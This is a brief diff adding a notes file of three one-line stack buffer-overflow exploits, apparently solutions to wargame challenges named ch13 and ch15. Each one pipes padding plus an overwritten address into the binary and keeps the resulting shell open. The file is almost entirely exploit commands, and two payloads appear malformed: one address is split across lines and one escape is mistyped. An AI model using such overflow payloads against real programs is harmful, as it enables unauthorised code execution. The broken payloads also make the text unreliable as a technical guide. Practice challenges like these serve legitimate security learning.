@@ -1,0 +1,7 @@
+1- cat <(python -c "print 'A'*40 + '\xef\xbe\xad\xde'") - | ./ch13
+The minus is very important to keep the shell
+2- cat <(python -c "print 'A'*128 + '\x08\xa0\x04\08'") - | ./ch15
+3-cat <(python -c "print 'A'*128 + '\x64\x84\x04\x
+08'") - | ./ch15
+
+
